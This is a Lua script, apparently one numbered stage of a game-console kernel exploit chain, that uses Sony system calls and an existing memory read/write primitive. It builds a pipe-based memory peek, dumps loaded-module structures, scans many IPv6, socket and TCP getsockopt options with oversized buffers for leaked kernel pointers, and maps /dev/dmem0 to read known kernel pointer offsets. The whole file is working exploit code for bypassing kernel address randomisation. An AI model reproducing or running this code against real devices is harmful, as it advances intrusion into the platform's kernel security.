-- step187: Proper GOT scan + getsockopt leak (using syscall.resolve, not make_syscall)
print("=== STEP187 ===")

local function tn(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function rq(a) return memory.read_qword(a) end
local function wq(a, v) memory.write_qword(a, v) end
local function rd(a) return memory.read_dword(a) end
local function wd(a, v) memory.write_dword(a, v) end
local function wb(a, v) memory.write_byte(a, v) end
local Z = uint64(0)

local function is_kptr(v)
    local vs = tostring(v)
    if vs:find("ffffffff8") or vs:find("ffffffff9") or
       vs:find("fffffffa") or vs:find("fffffffb") or
       vs:find("fffffffc") or vs:find("fffffffd") or
       vs:find("fffffffe") then return true end
    return false
end

-- Resolve ALL syscalls we need including Sony ones
syscall.resolve({
    read = 3, write = 4, close = 6,
    socket = 97, setsockopt = 105, getsockopt = 118,
    getpid = 20, writev = 121,
    dynlib_get_list = 592,
    dynlib_get_info = 593
})

-- Pipe for peek
local pipe_r, pipe_w
pcall(function() pipe_r, pipe_w = create_pipe() end)
local iov_b = memory.alloc(0x100)
local pbuf = memory.alloc(0x2000)

local function peek8(addr_u64)
    if not pipe_w or pipe_w == 0 then return nil end
    wq(iov_b, addr_u64)
    wq(iov_b + 8, uint64(8))
    local ok, r = pcall(function()
        return syscall.writev(uint64(pipe_w), iov_b, uint64(1))
    end)
    if not ok or tn(r) ~= 8 then return nil end
    for i = 0, 7 do wb(pbuf + i, 0) end
    syscall.read(uint64(pipe_r), pbuf, uint64(8))
    return rq(pbuf)
end

-- ==================================================================
-- T1: Get module list and dump eboot struct raw
-- ==================================================================
print("---T1: module list + struct dump---")

local eboot_seg3, eboot_seg3_sz, lk_text, lk_seg3, lk_seg3_sz

pcall(function()
    -- Get module list
    local id_buf = memory.alloc(0x400)
    local cnt = memory.alloc(8)
    wq(cnt, uint64(0x40))

    local rv = syscall.dynlib_get_list(id_buf, cnt, Z, Z, Z, Z)
    local mc = tn(rq(cnt))
    print("list rv=" .. tostring(rv) .. " count=" .. mc)

    -- Dump eboot module info (module 0)
    local info = memory.alloc(0x200)
    for i = 0, 0x1FF do wb(info + i, 0xAA) end
    wd(info, 0x160)

    local rv2 = syscall.dynlib_get_info(Z, info, Z, Z, Z, Z)
    print("info rv=" .. tostring(rv2))

    -- Dump all non-sentinel qwords
    for off = 0, 0x158, 8 do
        local v = rq(info + off)
        local n = tn(v)
        if n ~= 0 and n ~= 0xAAAAAAAAAAAAAAAA then
            print(string.format("  +%03x: %s", off, tostring(v)))
        end
    end

    -- Find name (look for ASCII starting with 'e')
    for off = 0, 0x80 do
        local b = tn(memory.read_byte(info + off))
        if b == 0x65 then -- 'e'
            local s = ""
            for j = 0, 31 do
                local c = tn(memory.read_byte(info + off + j))
                if c == 0 then break end
                if c >= 32 and c < 127 then s = s .. string.char(c) end
            end
            if s:find("eboot") then
                print("  NAME at +" .. string.format("%02x", off) .. ": " .. s)
                break
            end
        end
    end
end)

-- ==================================================================
-- T2: getsockopt oversized buffer test (properly handled)
-- ==================================================================
print("---T2: getsockopt leak scan---")
pcall(function()
    local buf = memory.alloc(0x400)
    local olen = memory.alloc(4)

    -- IPv6 UDP
    local s = syscall.socket(uint64(28), uint64(2), Z)
    print("ipv6=" .. tostring(s))

    -- Set PKTINFO (small option, 20 bytes)
    local pk = memory.alloc(0x20)
    for i = 0, 0x1F do wb(pk + i, 0) end
    syscall.setsockopt(s, uint64(41), uint64(46), pk, uint64(20))

    -- Get with larger buffer, sentinel-filled
    for i = 0, 0x3FF do wb(buf + i, 0xCC) end
    wd(olen, 0x400)
    local rv = syscall.getsockopt(s, uint64(41), uint64(46), buf, olen)
    local got = tn(rd(olen))
    print("PKTINFO: rv=" .. tostring(rv) .. " len=" .. got)

    if tn(rv) == 0 and got > 0 then
        -- Dump all returned bytes as hex
        for off = 0, got - 1, 8 do
            local v = rq(buf + off)
            if tn(v) ~= 0 then
                local tag = is_kptr(v) and " ***KPTR***" or ""
                print(string.format("  +%02x: %s%s", off, tostring(v), tag))
            end
        end
        -- Check sentinel beyond return length
        if got < 0x400 then
            local first_non_cc = -1
            for i = got, math.min(got + 31, 0x3FF) do
                if tn(memory.read_byte(buf + i)) ~= 0xCC then
                    first_non_cc = i
                    break
                end
            end
            if first_non_cc >= 0 then
                print("SENTINEL BROKEN at +" .. first_non_cc)
            end
        end
    end

    -- IPV6_2292PKTOPTIONS = 25
    for i = 0, 0x3FF do wb(buf + i, 0) end
    wd(olen, 0x400)
    local rv2 = syscall.getsockopt(s, uint64(41), uint64(25), buf, olen)
    local got2 = tn(rd(olen))
    print("2292PKTOPTS: rv=" .. tostring(rv2) .. " len=" .. got2)
    if tn(rv2) == 0 and got2 > 0 then
        for off = 0, math.min(got2 - 1, 127), 8 do
            local v = rq(buf + off)
            if tn(v) ~= 0 then
                local tag = is_kptr(v) and " ***KPTR***" or ""
                print(string.format("  +%02x: %s%s", off, tostring(v), tag))
            end
        end
    end

    -- IPV6_RECVPKTINFO then getsockopt IPV6_PKTINFO
    -- Set IPV6_RECVPKTINFO = 61 (turns on)
    local one = memory.alloc(4)
    wd(one, 1)
    syscall.setsockopt(s, uint64(41), uint64(61), one, uint64(4))

    -- Try many IPv6 options for leak
    local opts = {
        {36, "IPV6_UNICAST_HOPS"},
        {46, "IPV6_PKTINFO"},
        {47, "IPV6_HOPLIMIT"},
        {48, "IPV6_NEXTHOP"},
        {49, "IPV6_HOPOPTS"},
        {50, "IPV6_DSTOPTS"},
        {51, "IPV6_RTHDR"},
        {61, "IPV6_TCLASS"},
        {25, "IPV6_2292PKTOPTIONS"},
        {26, "IPV6_2292HOPOPTS"},
        {27, "IPV6_2292DSTOPTS"},
        {28, "IPV6_2292RTHDR"},
        {29, "IPV6_2292PKTINFO"},
        {30, "IPV6_2292HOPLIMIT"},
    }

    for _, opt in ipairs(opts) do
        for i = 0, 0xFF do wb(buf + i, 0) end
        wd(olen, 0x100)
        local rv_o = syscall.getsockopt(s, uint64(41), uint64(opt[1]), buf, olen)
        local len_o = tn(rd(olen))
        if tn(rv_o) == 0 and len_o > 0 then
            -- Check for kernel pointers
            local has_kptr = false
            for off = 0, math.min(len_o - 1, 255), 8 do
                local v = rq(buf + off)
                if is_kptr(v) then
                    has_kptr = true
                    print(string.format("  %s+%02x: %s ***KPTR***", opt[2], off, tostring(v)))
                end
            end
            if not has_kptr and len_o > 8 then
                print(string.format("  %s: %d bytes, clean", opt[2], len_o))
            end
        end
    end

    -- SOL_SOCKET options
    local sol_opts = {
        {0x0004, "SO_ERROR"},
        {0x0008, "SO_DEBUG"},
        {0x0100, "SO_RCVLOWAT"},
        {0x0200, "SO_SNDLOWAT"},
        {0x1001, "SO_SNDBUF"},
        {0x1002, "SO_RCVBUF"},
        {0x1005, "SO_SNDTIMEO"},
        {0x1006, "SO_RCVTIMEO"},
        {0x1007, "SO_ERROR2"},
        {0x1008, "SO_TYPE"},
        {0x1009, "SO_LABEL"},
        {0x100a, "SO_LISTENQLIMIT"},
        {0x100b, "SO_LISTENQLEN"},
        {0x100c, "SO_LISTENINCQLEN"},
        {0x1011, "SO_TS_CLOCK"},
        {0x1013, "SO_MAX_PACING_RATE"},
        {0x1014, "SO_DOMAIN"},
        {0x1015, "SO_PROTOCOL"},
    }

    for _, opt in ipairs(sol_opts) do
        for i = 0, 0xFF do wb(buf + i, 0) end
        wd(olen, 0x100)
        local rv_o = syscall.getsockopt(s, uint64(0xFFFF), uint64(opt[1]), buf, olen)
        local len_o = tn(rd(olen))
        if tn(rv_o) == 0 and len_o > 4 then
            -- Large return = interesting
            local has_kptr = false
            for off = 0, math.min(len_o - 1, 255), 8 do
                local v = rq(buf + off)
                if is_kptr(v) then
                    has_kptr = true
                    print(string.format("  %s+%02x: %s ***KPTR***", opt[2], off, tostring(v)))
                end
            end
            if has_kptr then
                print("*** KERNEL POINTER LEAKED via " .. opt[2] .. " ***")
            end
        end
    end

    -- TCP_INFO on TCP socket
    local tcp = syscall.socket(uint64(2), uint64(1), uint64(6))
    if tn(tcp) >= 0 then
        for i = 0, 0x3FF do wb(buf + i, 0) end
        wd(olen, 0x400)
        local rv_ti = syscall.getsockopt(tcp, uint64(6), uint64(32), buf, olen)
        local len_ti = tn(rd(olen))
        print("TCP_INFO: rv=" .. tostring(rv_ti) .. " len=" .. len_ti)
        if tn(rv_ti) == 0 and len_ti > 0 then
            for off = 0, math.min(len_ti - 1, 511), 8 do
                local v = rq(buf + off)
                if is_kptr(v) then
                    print(string.format("  TCP_INFO+%03x: %s ***KPTR***", off, tostring(v)))
                end
            end
        end
        syscall.close(tcp)
    end

    syscall.close(s)
end)

-- ==================================================================
-- T3: Offline analysis angle - check dmem0 kernel pointers
-- ==================================================================
print("---T3: dmem0 kptrs (quick recheck)---")
pcall(function()
    syscall.resolve({ open = 5, mmap = 477, munmap = 73 })

    local fd = syscall.open("/dev/dmem0", uint64(2), Z)
    print("dmem0=" .. tostring(fd))
    if tn(fd) < 0 then return end

    local va = syscall.mmap(Z, uint64(0x1000), uint64(1), uint64(1), fd, Z)
    print("va=" .. tostring(va))
    if tn(va) > 0 then
        -- Read the 4 known kernel pointer offsets
        local kp_offs = {0x18, 0x318, 0x330, 0x3f0}
        for _, off in ipairs(kp_offs) do
            local v = peek8(va + uint64(off))
            if v then
                print(string.format("  dmem0+%03x: %s", off, tostring(v)))
            end
        end
        syscall.munmap(va, uint64(0x1000))
    end
    syscall.close(fd)
end)

print("=== STEP187_DONE ===")
